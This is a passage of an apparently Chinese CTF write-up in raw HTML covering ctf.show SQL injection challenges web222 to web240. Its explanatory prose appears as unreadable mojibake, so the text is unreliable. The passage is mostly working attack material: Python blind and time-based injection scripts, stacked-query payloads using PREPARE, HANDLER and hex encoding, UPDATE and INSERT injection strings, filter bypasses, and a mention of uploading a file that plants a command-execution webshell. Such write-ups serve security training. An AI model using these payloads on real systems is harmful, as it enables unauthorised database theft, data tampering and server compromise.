class="language-python">import requestsimport timeurl&#x3D;&#39;http:&#x2F;&#x2F;60eb33c3-f99f-40ab-a612-d0085affb66a.challenge.ctf.show&#x2F;api&#x2F;index.php?u&#x3D;&#39;flag&#x3D;&#39;&#39;for i in range(1,100):    min&#x3D;32    max&#x3D;128    while 1:        j&#x3D;min+(max-min)&#x2F;&#x2F;2        if min&#x3D;&#x3D;j:            flag+&#x3D;chr(j)            print(flag)            break        #payload&#x3D;f&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;i&#125;,1))&lt;&#123;j&#125;,username,id)&quot;        #payload&#x3D;f&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flaga&#39;),&#123;i&#125;,1))&lt;&#123;j&#125;,username,id)&quot;        payload&#x3D;f&quot;if(ascii(substr((select group_concat(flagaabc) from ctfshow_flaga),&#123;i&#125;,1))&lt;&#123;j&#125;,username,id)&quot;        r&#x3D;requests.get(url&#x3D;url+payload).text        #print(r.text)        if len(r)&lt;288:            max&#x3D;j        else:            min&#x3D;j</code></pre><h2 id="web223"><a href="#web223" class="headerlink" title="web223"></a>web223</h2><p>è¿˜æ˜¯groupæ³¨å…¥</p><p>ä½†æ˜¯ è¿‡æ»¤äº†æ•°å­—ï¼Œä¹Ÿå°±æ˜¯è¯´ç”¨substrä¹‹ç±»çš„å‡½æ•°ä¸èƒ½ç›´æ¥ç”¨äº†</p><p>ä½†æ˜¯ç»è¿‡æµ‹è¯•è¿˜æ˜¯èƒ½å¤Ÿç›²æ³¨</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511141529576.png" alt="image-20220511141529576"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511141551392.png" alt="image-20220511141551392"></p><p>çœ‹å‡ºè¿”å›å€¼ä¸åŒï¼Œè€Œæ•°å­—å¯ä»¥åˆ©ç”¨web185é‡Œæåˆ°çš„trueä»£æ›¿</p><pre class="language-python" data-language="python"><code class="language-python">&quot;&quot;&quot;Author:Y4tacker&quot;&quot;&quot;import requestsdef generateNum(num):    res &#x3D; &#39;true&#39;    if num &#x3D;&#x3D; 1:        return res    else:        for i in range(num - 1):            res +&#x3D; &quot;+true&quot;        return resurl &#x3D; &quot;http:&#x2F;&#x2F;ff765902-0dec-4688-8cd2-1a4cc429d30a.chall.ctf.show&#x2F;api&#x2F;&quot;i &#x3D; 0res &#x3D; &quot;&quot;while 1:    head &#x3D; 32    tail &#x3D; 127    i &#x3D; i + 1    while head &lt; tail:        mid &#x3D; (head + tail) &gt;&gt; 1        # æŸ¥æ•°æ®åº“-ctfshow_flagas        # payload &#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&quot;        # æŸ¥å­—æ®µ-flagasabc        # payload &#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;ctfshow_flagas&#39;&quot;        # æŸ¥flag        payload &#x3D; &quot;select flagasabc from ctfshow_flagas&quot;        params &#x3D; &#123;            &quot;u&quot;: f&quot;if(ascii(substr((&#123;payload&#125;),&#123;generateNum(i)&#125;,&#123;generateNum(1)&#125;))&gt;&#123;generateNum(mid)&#125;,username,&#39;a&#39;)&quot;        &#125;        r &#x3D; requests.get(url, params&#x3D;params)        # print(r.json()[&#39;data&#39;])        if &quot;userAUTO&quot; in r.text:            head &#x3D; mid + 1        else:            tail &#x3D; mid    if head !&#x3D; 32:        res +&#x3D; chr(head)    else:        break    print(res)</code></pre><h2 id="web224"><a href="#web224" class="headerlink" title="web224"></a>web224</h2><p>åœ¨robots.txté‡Œæ‰¾åˆ°ä¸€ä¸ªé‡ç½®å¯†ç çš„é¡µé¢ï¼Œé‡ç½®ä¹‹åç›´æ¥ç™»å½•ï¼Œçœ‹åˆ°æ–‡ä»¶ä¸Šä¼ çš„é¡µé¢</p><p>ç„¶åè¯•äº†è¯•ï¼Œæ€ä¹ˆæ„Ÿè§‰ä»€ä¹ˆä¹Ÿä¼ ä¸ä¸Šå»</p><p>ctfshowçš„ç¾¤é‡Œæœ‰ä¸ªpayload.binæŠŠè¿™ä¸ªä¼ ä¸Šå»ä¹‹åå°±ç›´æ¥ç”Ÿæˆäº†ä¸€ä¸ªæœ¨é©¬</p><p>è®¿é—®1.phpå‘½ä»¤æ‰§è¡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511143349476.png" alt="image-20220511143349476"></p><p>åŸç†çœ‹è¿™ä¸ª</p><p><a href="https://blog.gem-love.com/ctf/2283.html#%E4%BD%A0%E6%B2%A1%E8%A7%81%E8%BF%87%E7%9A%84%E6%B3%A8%E5%85%A5">https://blog.gem-love.com/ctf/2283.html#%E4%BD%A0%E6%B2%A1%E8%A7%81%E8%BF%87%E7%9A%84%E6%B3%A8%E5%85%A5</a></p><h2 id="web225"><a href="#web225" class="headerlink" title="web225"></a>web225</h2><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;åˆ†é¡µæŸ¥è¯¢$sql &#x3D; &quot;select id,username,pass from ctfshow_user where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;;    </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;å¸ˆå‚…è¯´è¿‡æ»¤çš„è¶Šå¤šè¶Šå¥½if(preg_match(&#39;&#x2F;file|into|dump|union|select|update|delete|alter|drop|create|describe|set&#x2F;i&#39;,$username))&#123;  die(json_encode($ret));&#125;    </code></pre><p>é¢˜ç›®æç¤ºæ˜¯å †å æ³¨å…¥äº†</p><p>selectè¢«è¿‡æ»¤äº†ï¼Œåˆ©ç”¨å¸¸è§„çš„å †å æ³¨å…¥</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511150345663.png" alt="image-20220511150345663"></p><p>åªèƒ½æŸ¥åˆ°è¿™äº†</p><p>å’Œå¼ºç½‘æ¯é‚£é“å·®ä¸å¤š</p><p>å…ˆè®©æˆ‘ä»¬çœ‹çœ‹å¼ºç½‘æ¯çš„payload</p><pre class="language-sql" data-language="sql"><code class="language-sql">æ–¹æ³•ä¸€ ä½¿ç”¨renameå’Œalter1&#39;;rename tables &#96;words&#96; to &#96;words1&#96;;rename tables &#96;1919810931114514&#96; to &#96;words&#96;; alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; varchar(100);#æ–¹æ³•äºŒ ä½¿ç”¨handler0&#39;;handler &#96;1919810931114514&#96; open;handler &#96;1919810931114514&#96; read first;#æ–¹æ³•ä¸‰ ä½¿ç”¨é¢„å¤„ç†è¯­å¥0&#39;;set @sql&#x3D;concat(&#39;sele&#39;,&#39;ct &#96;flag&#96; from &#96;1919810931114514&#96;&#39;);PREPARE stmt1 from @sql;EXECUTE stmt1;#</code></pre><p>è€Œè¿™é“é¢˜alterè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨é¢„å¤„ç†ï¼Œæˆ–è€…æ˜¯handler</p><p>åˆå› ä¸ºè¿‡æ»¤äº†setï¼Œæ–¹æ³•ä¸‰æ‰€ä»¥ç›´æ¥å†™è¯­å¥å°±è¡Œ</p><p><a href="https://blog.csdn.net/solitudi/article/details/107823398">https://blog.csdn.net/solitudi/article/details/107823398</a></p><p><a href="https://blog.csdn.net/rfrder/article/details/108583338">(4æ¡æ¶ˆæ¯) æ”»é˜²ä¸–ç•Œ-Webé«˜æ‰‹è¿›é˜¶åŒº-supersqli(å¼ºç½‘æ¯çš„éšä¾¿æ³¨)_rfrderçš„åšå®¢-CSDNåšå®¢</a></p><h3 id="é¢„å¤„ç†SQL"><a href="#é¢„å¤„ç†SQL" class="headerlink" title="é¢„å¤„ç†SQL"></a>é¢„å¤„ç†SQL</h3><p>é¢„ç¼–è¯‘è¯­å¥çš„ä¼˜åŠ¿åœ¨äºå½’çº³ä¸ºï¼šä¸€æ¬¡ç¼–è¯‘ã€å¤šæ¬¡è¿è¡Œï¼Œçœå»äº†è§£æä¼˜åŒ–ç­‰è¿‡ç¨‹ï¼›æ­¤å¤–é¢„ç¼–è¯‘è¯­å¥èƒ½é˜²æ­¢ SQL æ³¨å…¥ã€‚ã€€MySQL é¢„å¤„ç†è¯­å¥çš„æ”¯æŒç‰ˆæœ¬è¾ƒæ—©ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›®å‰æ™®éä½¿ç”¨çš„ MySQL ç‰ˆæœ¬éƒ½æ˜¯æ”¯æŒè¿™ä¸€è¯­æ³•çš„ã€‚<br>ç®€å•ç”¨æ³•ï¼š</p><p>ä½¿ç”¨æ–¹æ³•<br>MySQL å®˜æ–¹å°† prepareã€executeã€deallocate ç»Ÿç§°ä¸º PREPARE STATEMENTã€‚ç¿»è¯‘ä¹Ÿå°±ä¹ æƒ¯çš„ç§°å…¶ä¸ºé¢„å¤„ç†è¯­å¥ã€‚</p><pre class="language-none"><code class="language-none">PREPARE name from &#39;[my sql sequece]&#39;;   &#x2F;&#x2F;é¢„å®šä¹‰SQLè¯­å¥EXECUTE name;  &#x2F;&#x2F;æ‰§è¡Œé¢„å®šä¹‰SQLè¯­å¥(DEALLOCATE || DROP) PREPARE name;  &#x2F;&#x2F;åˆ é™¤é¢„å®šä¹‰SQLè¯­å¥</code></pre><p>å­—ç¬¦ä¸²å®šä¹‰é¢„å¤„ç†</p><pre class="language-none"><code class="language-none">PREPARE stmt1 FROM &#39;SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse&#39;;ET @a &#x3D; 3;SET @b &#x3D; 4;                                                   EXECUTE stmt1 USING @a, @b;</code></pre><p>å˜é‡å®šä¹‰é¢„å¤„ç† SQL</p><pre class="language-none"><code class="language-none">SET @s &#x3D; &#39;SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse&#39;;PREPARE stmt2 FROM @s;SET @c &#x3D; 6;ET @d &#x3D; 8;EXECUTE stmt2 USING @c, @d;DEALLOCATE PREPARE stmt2;</code></pre><p>åœ¨è¿™é“é¢˜é‡Œå°±æ˜¯è¿™æ ·çš„</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39;;prepare Sentiment from concat(char(115,101,108,101,99,116),&#39;* from ctfshow_flagasa&#39;);execute Sentiment;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511151309635.png" alt="image-20220511151309635"></p><h3 id="handler"><a href="#handler" class="headerlink" title="handler"></a>handler</h3><p>HANDLER â€¦ OPENè¯­å¥æ‰“å¼€ä¸€ä¸ªè¡¨ï¼Œä½¿å…¶å¯ä»¥ä½¿ç”¨åç»­HANDLER â€¦ READè¯­å¥è®¿é—®ï¼Œè¯¥è¡¨å¯¹è±¡æœªè¢«å…¶ä»–ä¼šè¯å…±äº«ï¼Œå¹¶ä¸”åœ¨ä¼šè¯è°ƒç”¨HANDLER â€¦ CLOSEæˆ–ä¼šè¯ç»ˆæ­¢ä¹‹å‰ä¸ä¼šå…³é—­</p><p>payload</p><pre class="language-sql" data-language="sql"><code class="language-sql">ctfshow&#39;;handler &#96;ctfshow_flagasa&#96; open;handler &#96;ctfshow_flagasa&#96; read first;--+</code></pre><h2 id="web226ã€228ã€229ã€230"><a href="#web226ã€228ã€229ã€230" class="headerlink" title="web226ã€228ã€229ã€230"></a>web226ã€228ã€229ã€230</h2><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;åˆ†é¡µæŸ¥è¯¢$sql &#x3D; &quot;select id,username,pass from ctfshow_user where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;;    </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;å¸ˆå‚…è¯´è¿‡æ»¤çš„è¶Šå¤šè¶Šå¥½if(preg_match(&#39;&#x2F;file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\(&#x2F;i&#39;,$username))&#123;  die(json_encode($ret));&#125;</code></pre><p>showè¢«è¿‡æ»¤äº†ï¼Œé‚£handleå°±ç”¨ä¸äº†äº†ï¼Œå› ä¸ºä¸èƒ½ç›´æ¥show tablesçœ‹è¡¨åï¼Œæ‰€ä»¥åªèƒ½åˆ©ç”¨é¢„å¤„ç†äº†</p><p>è½¬åå…­è¿›åˆ¶å°±è¡Œ</p><pre class="language-sql" data-language="sql"><code class="language-sql">&#39;;prepare a from 0x73686f77207461626c6573;execute a;#</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511152014805.png" alt="image-20220511152014805"></p><pre class="language-sql" data-language="sql"><code class="language-sql">&#39;;prepare a from 0x73656c656374202a2066726f6d2063746673685f6f775f666c61676173;execute a;#</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511152050147.png" alt="image-20220511152050147"></p><p>å½“ç„¶ï¼Œè¦æ˜¯æƒ³é¢„å¤„ç†æŸ¥å‡ºè¡¨åä¹‹åå†ç”¨handlerä¹Ÿä¸æ˜¯ä¸è¡Œï¼ˆ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511152314670.png" alt="image-20220511152314670"></p><h2 id="web227"><a href="#web227" class="headerlink" title="web227"></a>web227</h2><p>è¡¨é‡Œæ²¡flag</p><p>è¿™é“é¢˜è€ƒç‚¹å…¶å®æ˜¯<code>æŸ¥çœ‹MySQLçš„å­˜å‚¨è¿‡ç¨‹</code><br>çœ‹çœ‹ç½‘ä¸Šè¿™ç¯‡æ–‡ç« <a href="https://blog.csdn.net/qq_41573234/article/details/80411079">MySQLâ€”â€”æŸ¥çœ‹å­˜å‚¨è¿‡ç¨‹å’Œå‡½æ•°</a><br>æˆ‘ä»¬å»æŸ¥<code>information_schema.routines</code>è¡¨</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511163703317.png" alt="image-20220511163703317"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511163652949.png" alt="image-20220511163652949"></p><h2 id="web231"><a href="#web231" class="headerlink" title="web231"></a>web231</h2><blockquote><p>updateæ³¨å…¥</p></blockquote><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;åˆ†é¡µæŸ¥è¯¢$sql &#x3D; &quot;update ctfshow_user set pass &#x3D; &#39;&#123;$password&#125;&#39; where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;;    </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;æ— è¿‡æ»¤</code></pre><p>å¯ä»¥çœ‹è§è¿™é‡Œå°±ä¸æ˜¯æŸ¥è¯¢è¯­å¥ï¼Œè€Œæ˜¯ç”¨updateæ¥æ›´æ–°</p><blockquote><p>updateæ›´æ–°æ•°æ®</p></blockquote><p>æ³¨å…¥ç‚¹æ˜¯apiçš„passwordå’Œusernameï¼Œéƒ½æ˜¯ä¼ POST</p><p>å¯ä»¥é€šè¿‡é—­åˆpassword,åœ¨ç¬¬ä¸€ä¸ªæ³¨å…¥ç‚¹æ‰§è¡Œwhereæ¡ä»¶æŸ¥è¯¢è¯­å¥,å¹¶å°†åè¾¹çš„whereé—­åˆæ‰(æ³¨å…¥ç‚¹/api/ postä¼ å‚username,password),æˆ–è€…æ˜¯åˆ©ç”¨æ—¶é—´ç›²æ³¨</p><p>å½“æˆ‘ä»¬POSTä¸€ä¸ªpassword=user&#39;,username=database()#&amp;username=1</p><p>åˆ·æ–°ä¸€ä¸‹é‚£ä¸ªæŸ¥è¯¢ç•Œé¢ï¼Œå°±ä¼šå‘ç°ï¼Œéƒ½å˜æˆäº†ctfshow_web</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511172837773.png" alt="image-20220511172837773"></p><p>å› ä¸ºè¿™æ—¶å€™çš„è¯­å¥ä¸º</p><pre class="language-sql" data-language="sql"><code class="language-sql">update ctfshow_user set pass &#x3D; &#39;user&#39;,username&#x3D;database()#&amp;username&#x3D;1&#39; where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;;</code></pre><p>ä¹Ÿå°±æ˜¯</p><pre class="language-sql" data-language="sql"><code class="language-sql">update ctfshow_user set pass &#x3D; &#39;user&#39;,username&#x3D;database()</code></pre><p>å°†database()è¦†ç›–äº†usernameåŸæ¥çš„æ•°æ®ï¼Œå®ç°äº†sqlæ³¨å…¥</p><p>ç„¶åå°±æ˜¯æŸ¥è¡¨æŸ¥åˆ—åæŸ¥flagäº†</p><p>payload</p><pre class="language-sql" data-language="sql"><code class="language-sql">password&#x3D;user&#39;,username&#x3D;(select flagas from flaga) where 1&#x3D;1#&amp;username&#x3D;1</code></pre><h2 id="web232"><a href="#web232" class="headerlink" title="web232"></a>web232</h2><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;åˆ†é¡µæŸ¥è¯¢$sql &#x3D; &quot;update ctfshow_user set pass &#x3D; md5(&#39;&#123;$password&#125;&#39;) where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;;    </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;æ— è¿‡æ»¤</code></pre><p>passwordç»è¿‡äº†md5åŠ å¯†</p><p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥å°è¯•é—­åˆmd5å‡½æ•°ï¼Œå®ç°é€ƒé€¸</p><p>æ¯”å¦‚è¾“å…¥</p><pre class="language-sql" data-language="sql"><code class="language-sql">password&#x3D;1&#39;),username&#x3D;database()#&amp;username&#x3D;1</code></pre><p>ç„¶åæ•´ä¸ªè¯­å¥å˜ä¸º</p><pre class="language-sql" data-language="sql"><code class="language-sql">update ctfshow_user set pass &#x3D; md5(&#39;1&#39;),username&#x3D;database()#&#39;) where username &#x3D; &#39;1&#39;;&quot;;</code></pre><p>ä¹Ÿå°±æ˜¯</p><pre class="language-sql" data-language="sql"><code class="language-sql">update ctfshow_user set pass &#x3D; md5(&#39;1&#39;),username&#x3D;database()</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511174011548.png" alt="image-20220511174011548"></p><p>åè¾¹å°±å’Œweb231ä¸€æ ·äº†</p><h2 id="web233"><a href="#web233" class="headerlink" title="web233"></a>web233</h2><p>å’Œ231ä¸€æ ·çš„ä»£ç ï¼Œä¹Ÿæ²¡è¿‡æ»¤ï¼Œå°±æ˜¯ä¸ç»™å›æ˜¾äº†</p><p>ç”¨è¿™ä¸ªæµ‹ä¸€ä¸‹å‘ç°èƒ½æ—¶é—´ç›²æ³¨</p><pre class="language-sql" data-language="sql"><code class="language-sql">username&#x3D;1&#39; or if(1&#x3D;1,sleep(0.02),0)#&amp;password&#x3D;1</code></pre><pre class="language-none"><code class="language-none">import requestsimport timeurl&#x3D;&#39;http:&#x2F;&#x2F;7cf24fdd-904d-48f6-81ac-0b88a27076ca.challenge.ctf.show&#x2F;api&#x2F;&#39;flag&#x3D;&#39;&#39;for i in range(60):    min&#x3D;32    max&#x3D;128    while 1:        j&#x3D;min+(max-min)&#x2F;&#x2F;2        if min&#x3D;&#x3D;j:            flag+&#x3D;chr(j)            print(flag)            break        #payload&#x3D;f&quot;&#39; or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.02),1)#&quot;        #payload&#x3D;f&quot;&#39; or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag233333&#39;),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.02),1)#&quot;        payload&#x3D;f&quot;&#39; or if(ascii(substr((select group_concat(flagass233) from flag233333),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.02),1)#&quot;        data&#x3D;&#123;            &#39;username&#39;: payload,            &#39;password&#39;:&#39;1&#39;&#125;        try:            r&#x3D;requests.post(url&#x3D;url,data&#x3D;data,timeout&#x3D;0.35)            min&#x3D;j        except:            max&#x3D;j        time.sleep(0.3)</code></pre><h2 id="web234"><a href="#web234" class="headerlink" title="web234"></a>web234</h2><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;åˆ†é¡µæŸ¥è¯¢$sql &#x3D; &quot;update ctfshow_user set pass &#x3D; &#39;&#123;$password&#125;&#39; where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;;    </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;æ— è¿‡æ»¤</code></pre><p>è™½ç„¶å˜´ä¸Šè¯´ç€æ²¡è¿‡æ»¤ï¼Œä½†æ˜¯å®é™…ä¸Šè¿˜æ˜¯è¿‡æ»¤äº†å•å¼•å·</p><p>å¯ä»¥ç”¨æ–œæ æ³¨é‡Šæ‰åé¢çš„æ–œæ ï¼Œè®©å®ƒä¸usernameçš„ç¬¬ä¸€ä¸ªå•å¼•å·é—­åˆ</p><p>è¿™æ—¶çš„è¯­å¥ä¸º</p><pre class="language-sql" data-language="sql"><code class="language-sql">$sql &#x3D; &quot;update ctfshow_user set pass &#x3D; &#39;\&#39; where username &#x3D; &#39;username&#39;;&quot;;</code></pre><p>å› ä¸ºusernameå¯æ§ï¼Œæˆ‘ä»¬åªè¦å§æœ€åä¸€ä¸ªå¼•å·æ³¨é‡Šï¼Œé‚£ä¹ˆ<code>\&#39; where username = </code>è¿™éƒ¨åˆ†å°±ç›¸å½“äºpasswordçš„å€¼ï¼Œ</p><p>æ‰€ä»¥å½“æˆ‘ä»¬è¾“å…¥<code>password=\&amp;username=,username=database();#</code>æ—¶</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511175743362.png" alt="image-20220511175743362"></p><p>ç„¶åå°±æ˜¯æ­£å¸¸çš„æŸ¥è¯¢äº†</p><pre class="language-txt" data-language="txt"><code class="language-txt">password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())##banlist,ctfshow_user,flag23apassword&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x666c6167323361)#å› ä¸ºè¿‡æ»¤äº†å•å¼•å·ï¼Œæ‰€ä»¥16è¿›åˆ¶ç»•è¿‡ã€‚#id,flagass23s3,infopassword&#x3D;\&amp;username&#x3D;,username&#x3D;(select flagass23s3 from flag23a)#</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511180002985.png" alt="image-20220511180002985"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511180011342.png" alt="image-20220511180011342"></p><h2 id="web235"><a href="#web235" class="headerlink" title="web235"></a>web235</h2><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;åˆ†é¡µæŸ¥è¯¢$sql &#x3D; &quot;update ctfshow_user set pass &#x3D; &#39;&#123;$password&#125;&#39; where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;;    </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;è¿‡æ»¤ or &#39; </code></pre><p>è¿‡æ»¤äº†orå°±ä¸èƒ½ç”¨informationäº†ï¼Œå¯ä»¥è¯•è¯•ä»å…¶ä»–è¡¨é‡Œæ‰¾è¡¨å</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511224228030.png" alt="image-20220511224228030"></p><p>ç”¨mysql.innodb_table_statsæ¥ä»£æ›¿information_schemaã€‚table_schemaå°±è¦æ”¹æˆdatabase_nameã€‚è¯­å¥åˆ™æ˜¯</p><pre class="language-sql" data-language="sql"><code class="language-sql">password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(table_name) from mysql.innodb_table_stats where database_name&#x3D;database())#</code></pre><p>çœ‹åˆ°è¡¨åä¹‹åå°±æ˜¯åˆ©ç”¨æ— åˆ—åæ³¨å…¥äº†</p><p><a href="https://www.cnblogs.com/GH-D/p/11962522.html">https://www.cnblogs.com/GH-D/p/11962522.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/98206699">https://zhuanlan.zhihu.com/p/98206699</a></p><p>æœ€ç»ˆpayloadä¸º</p><pre class="language-sql" data-language="sql"><code class="language-sql">password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(&#96;2&#96;) from (select 1,2,3 union select * from flag23a1)a)#</code></pre><h2 id="web236"><a href="#web236" class="headerlink" title="web236"></a>web236</h2><blockquote><p>update</p></blockquote><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;åˆ†é¡µæŸ¥è¯¢$sql &#x3D; &quot;update ctfshow_user set pass &#x3D; &#39;&#123;$password&#125;&#39; where username &#x3D; &#39;&#123;$username&#125;&#39;;&quot;;    </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;è¿‡æ»¤ or &#39; flag</code></pre><p>å…¶å®æ²¡è¿‡æ»¤ï¼Œç”¨ä¸Šä¸ªé¢˜çš„payloadå°±è¡Œ</p><p>å¦‚æœè¿‡æ»¤äº†ä¹Ÿå¯ä»¥ç”¨è¿™ä¸ª</p><pre class="language-sql" data-language="sql"><code class="language-sql">username&#x3D;,username&#x3D;(select to_base64(b) from (select 1,2 as b,3 union select * from flaga limit 1,1)a)-- - &amp;password&#x3D;\</code></pre><h2 id="web237"><a href="#web237" class="headerlink" title="web237"></a>web237</h2><p>æŸ¥è¯¢è¯­å¥</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;æ’å…¥æ•°æ®$sql &#x3D; &quot;insert into ctfshow_user(username,pass) value(&#39;&#123;$username&#125;&#39;,&#39;&#123;$password&#125;&#39;);&quot;;</code></pre><p>insertå°±æ˜¯æ’å…¥ã€‚ä½†å…¶å®æ³¨å…¥æ–¹å¼å’Œä¸€èˆ¬çš„æ²¡æœ‰åŒºåˆ«,åªæ˜¯è¯´è‡ªå·±æ„é€ å‡ºæŸ¥è¯¢è¯­å¥ï¼ŒæŸ¥è¯¢çš„ç»“æœè¿”å›åœ¨é‚£ä¸ªè¡¨å½“ä¸­äº†</p><p>é€šè¿‡ç¬¬ä¸€ä¸ªæ³¨å…¥ç‚¹å°†åè¾¹â€™)&#39;é—­åˆå³å¯</p><pre class="language-none"><code class="language-none">username&#x3D;helloworld&#39;,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()))#&amp;password&#x3D;1username&#x3D;helloworld&#39;,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag&#39;));#&amp;password&#x3D;1username&#x3D;helloworld&#39;,(select group_concat(flagass23s3) from flag))#&amp;password&#x3D;1</code></pre><h2 id="web238"><a href="#web238" class="headerlink" title="web238"></a>web238</h2><p>insertæ³¨å…¥ï¼Œè¿‡æ»¤ç©ºæ ¼</p><p>ç”¨æ‹¬å·æ³¨é‡Šç¬¦éƒ½èƒ½æ›¿ä»£</p><pre class="language-none"><code class="language-none">username&#x3D;helloworld&#39;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;database())));#&amp;password&#x3D;1username&#x3D;helloworld&#39;,(select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;flagb&#39;)));#&amp;password&#x3D;1username&#x3D;helloworld&#39;,(select(group_concat(flag))from(flagb)));#&amp;password&#x3D;1</code></pre><h2 id="web239"><a href="#web239" class="headerlink" title="web239"></a>web239</h2><p>è¿‡æ»¤äº†ç©ºæ ¼å’Œorï¼Œå› ä¸ºè¿‡æ»¤äº†orï¼Œæ‰€ä»¥information_schemaå°±ç”¨ä¸äº†äº†ï¼Œå¯ä»¥å‚è€ƒweb235</p><pre class="language-none"><code class="language-none">username&#x3D;1&#39;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name&#x3D;database())))#&amp;password&#x3D;1</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220511225919771.png" alt="image-20220511225919771"></p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39;,(select(flag)from(flagbb)));#&amp;password&#x3D;1</code></pre><h2 id="web240"><a href="#web240" class="headerlink" title="web240"></a>web240</h2><p>Hint: è¡¨åå…±9ä½ï¼Œflagå¼€å¤´ï¼Œåäº”ä½ç”±a/bç»„æˆï¼Œå¦‚flagabaabï¼Œå…¨å°å†™ã€‚è¿‡æ»¤ç©ºæ ¼ or sys mysql</p><p>æ ¹æ®å‰é¢éƒ½æ˜¯åœ¨flagé‡Œï¼Œæ‰€ä»¥flagå…ˆç¡®å®šä¸‹æ¥ã€‚ç„¶åç›´æ¥å†™è„šæœ¬</p><pre class="language-sql" data-language="sql"><code class="language-sql">import requestsimport itertoolsurl &#x3D; &quot;http:&#x2F;&#x2F;a31fe426-9043-4aaf-b986-6270c466a4da.challenge.ctf.show&#x2F;api&#x2F;insert.php&quot;for i in itertools.product(&#39;ab&#39;, repeat &#x3D; 5):    tables &#x3D; &quot;flag&quot; + &#39;&#39;.join(i)    payload &#x3D; &#123;        &#39;username&#39;: f&quot;hellow0rld&#39;,(select(group_concat(flag))from(&#123;tables&#125;)))#&quot;,        &#39;password&#39;: &#39;1&#39;    &#125;    r &#x3D; requests.post(url&#x3D;url, data&#x3D;payload)</code></pre><p>çº¯çˆ†ç ´</p><h2 id="web241"><a href="#web241" class="headerlink" 